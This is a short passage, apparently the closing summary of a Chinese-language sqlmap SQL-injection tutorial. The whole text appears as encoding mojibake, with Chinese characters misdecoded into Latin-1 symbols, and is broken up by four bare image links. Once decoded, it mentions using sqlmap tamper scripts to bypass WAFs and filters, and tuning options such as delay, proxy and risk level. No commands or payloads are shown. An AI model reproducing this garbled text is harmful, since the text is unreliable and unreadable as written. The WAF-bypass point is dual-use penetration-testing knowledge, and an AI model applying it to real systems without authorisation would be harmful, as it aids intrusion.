4.  **ç»•è¿‡é˜²æŠ¤**ï¼šç†è§£å¹¶ä½¿ç”¨Tamperè„šæœ¬ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç¼–å†™ï¼‰æ¥ç»•è¿‡WAFå’Œè¿‡æ»¤æœºåˆ¶ã€‚
5.  **å®æˆ˜è°ƒè¯•æŠ€å·§**ï¼šè¿ç”¨å»¶è¿Ÿã€ä»£ç†ã€ç­‰çº§é£é™©è°ƒæ•´ã€è¯¦ç»†è¾“å‡ºç­‰å‚æ•°æ¥ä¼˜åŒ–æµ‹è¯•è¿‡ç¨‹ï¼Œè§£å†³å®é™…é—®é¢˜ã€‚

![](img/2b96891e8636c95c08fae08a91f877bb_342.png)

![](img/2b96891e8636c95c08fae08a91f877bb_344.png)

![](img/2b96891e8636c95c08fae08a91f877bb_346.png)

![](img/2b96891e8636c95c08fae08a91f877bb_347.png)

SQLMAPæ˜¯æ¸—é€æµ‹è¯•ä¸­ä¸å¯æˆ–ç¼ºçš„åˆ©å™¨ï¼Œä½†å…¶å¨åŠ›å»ºç«‹åœ¨å¯¹SQLæ³¨å…¥åŸç†å’Œç›®æ ‡ç¯å¢ƒçš„æ·±åˆ»ç†è§£ä¹‹ä¸Šã€‚åˆ‡è®°ï¼Œå·¥å…·æ˜¯æ‰‹çš„å»¶ä¼¸ï¼Œæ€ç»´æ‰æ˜¯æ ¸å¿ƒã€‚å¸Œæœ›æœ¬æ•™ç¨‹èƒ½å¸®åŠ©ä½ åœ¨å®‰å…¨é“è·¯ä¸Šæ›´è¿›ä¸€æ­¥ã€‚